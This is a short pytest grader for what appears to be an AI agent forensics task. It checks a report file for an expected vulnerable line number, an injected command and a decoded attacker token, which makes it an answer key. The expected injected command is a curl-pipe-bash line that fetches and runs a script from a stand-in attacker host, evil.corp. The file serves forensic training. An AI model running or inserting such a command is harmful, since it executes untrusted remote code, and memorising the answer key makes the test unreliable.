# test_final_state.py

import os

def test_forensics_report_exists():
    assert os.path.isfile("/home/user/forensics_report.txt"), "/home/user/forensics_report.txt is missing"

def test_forensics_report_content():
    expected_values = {
        "VULN_LINE": "15",
        "INJECTED_CMD": "curl http://evil.corp/payload.sh | bash",
        "DECODED_TOKEN": "mal_attacker_token_884"
    }

    report_path = "/home/user/forensics_report.txt"
    assert os.path.isfile(report_path), f"{report_path} does not exist."

    with open(report_path, "r") as f:
        lines = f.read().splitlines()

    parsed_values = {}
    for line in lines:
        if "=" in line:
            key, val = line.split("=", 1)
            parsed_values[key.strip()] = val.strip()

    for key, expected_val in expected_values.items():
        assert key in parsed_values, f"Key {key} is missing from forensics_report.txt"
        assert parsed_values[key] == expected_val, f"Expected {key} to be '{expected_val}', but got '{parsed_values[key]}'"